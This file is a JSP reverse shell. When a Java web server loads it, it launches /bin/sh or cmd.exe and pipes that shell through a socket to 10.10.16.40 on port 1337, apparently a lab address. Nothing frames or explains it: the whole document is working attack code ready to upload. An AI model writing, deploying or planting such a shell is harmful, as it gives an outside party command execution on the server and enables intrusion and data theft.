<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream sh;
    OutputStream uw;

    StreamConnector( InputStream sh, OutputStream uw )
    {
      this.sh = sh;
      this.uw = uw;
    }

    public void run()
    {
      BufferedReader ah  = null;
      BufferedWriter fbk = null;
      try
      {
        ah  = new BufferedReader( new InputStreamReader( this.sh ) );
        fbk = new BufferedWriter( new OutputStreamWriter( this.uw ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ah.read( buffer, 0, buffer.length ) ) > 0 )
        {
          fbk.write( buffer, 0, length );
          fbk.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ah != null )
          ah.close();
        if( fbk != null )
          fbk.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.16.40", 1337 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
